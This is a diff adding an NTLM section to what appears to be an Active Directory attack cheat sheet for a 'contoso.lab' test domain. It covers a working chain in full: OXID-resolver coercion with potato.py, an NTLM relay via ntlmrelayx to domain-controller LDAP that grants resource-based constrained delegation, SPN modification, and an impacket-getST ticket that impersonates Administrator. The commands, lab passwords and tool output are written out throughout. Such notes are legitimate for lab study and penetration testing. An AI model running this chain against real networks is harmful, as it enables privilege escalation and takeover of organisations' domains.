@@ -103,3 +103,65 @@ python3 /usr/share/krbrelayx/krbrelayx.py \
 # [*] HTTP server returned status code 200, treating as a successful login
 # [*] Skipping user desktop-mw01.sales.contoso.lab since attack was already performed
 ```
+
+## NTLM
+
+### relay from `Initial OXID Resolution Request`
+
+```bash
+python3 examples/potato.py \
+-clsid 'D99E6E74-FC88-11D0-B498-00A0C90312F3' \
+-relay-ip 192.168.1.145 \
+sales/alice:'1AM4l1c3!?1'@win-srv01.sales.contoso.lab
+
+python3 rpcoxidresolver.py -oip 192.168.1.145 -rip 192.168.1.145 -rport 9997
+# server start listening
+# Got NTLM_TYPE_1 message. Replying with NTLM_TYPE_2
+# Got NTLM_TYPE_3 message skipping it...
+# Got resolveOxid2 request with auth_len != 0. Skipping it...
+# ('unpack requires a buffer of 4 bytes', "When unpacking field 'alloc_hint | <L=0 | b''[:4]'")
+# Got MSRPC_BIND message with no NTLM_TYPE_1 message. Replying with MSRPC_BINDACK
+# [+] Got resolveOxid2 Request with auth_len == 0. Redirecting victim to rpc relay server 192.168.1.145[9997]
+# ('unpack requires a buffer of 4 bytes', "When unpacking field 'alloc_hint | <L=0 | b''[:4]'")
+
+ntlmrelayx.py -t ldap://win-dc02.sales.contoso.lab --rpc-port 9997 --delegate-access --escalate-user 'alice'
+# ...
+# [*] Servers started, waiting for connections
+# [*] Callback added for UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A V:0.0
+# [*] RPCD: Received connection from 192.168.1.21, attacking target ldap://win-dc02.sales.contoso.lab
+# [*] Authenticating against ldap://win-dc02.sales.contoso.lab as SALES\WIN-SRV01$ SUCCEED
+# [*] Enumerating relayed user's privileges. This may take a while on large domains
+# [-] Exception in RPC request handler: b'C\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F\x00\x00\x00\x00'
+# [*] Delegation rights modified succesfully!
+# [*] alice can now impersonate users on WIN-SRV01$ via S4U2Proxy
+
+# confirm that user does indeed have RBCD right now
+bloodyAD --host 192.168.1.12 -d sales.contoso.lab -u alice -p '1AM4l1c3!?1' get object 'win-srv01$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
+# distinguishedName: CN=WIN-SRV01,OU=Machines,DC=sales,DC=contoso,DC=lab
+# msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-1548103905-787397850-1049434999-1104)(A;;0xf01ff;;;S-1-5-21-1548103905-787397850-1049434999-1104)(A;;0xf01ff;;;S-1-5-21-1548103905-787397850-1049434999-1105)
+
+lookupsid.py sales.contoso.lab/alice:'1AM4l1c3!?1'@192.168.1.12 | grep -i "alice"
+# 1105: SALES\alice (SidTypeUser)
+
+addspn -u 'sales.contoso.lab\lmodifr' -p '94Dk5@!nDM' \
+-s HOST/alice.sales.contoso.lab \
+-t alice \
+win-dc02.sales.contoso.lab
+# [-] Connecting to host...
+# [-] Binding to host
+# [+] Bind OK
+# [+] Found modification target
+# [+] SPN Modified successfully
+
+impacket-getST -spn 'CIFS/WIN-SRV01' \
+-impersonate Administrator \
+-dc-ip 192.168.1.12 'sales.contoso.lab'/'alice':'1AM4l1c3!?1'
+# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+# 
+# [-] CCache file is not found. Skipping...
+# [*] Getting TGT for user
+# [*] Impersonating Administrator
+# [*] Requesting S4U2self
+# [*] Requesting S4U2Proxy
+# [*] Saving ticket in Administrator@CIFS_WIN-SRV01@SALES.CONTOSO.LAB.ccache
+```
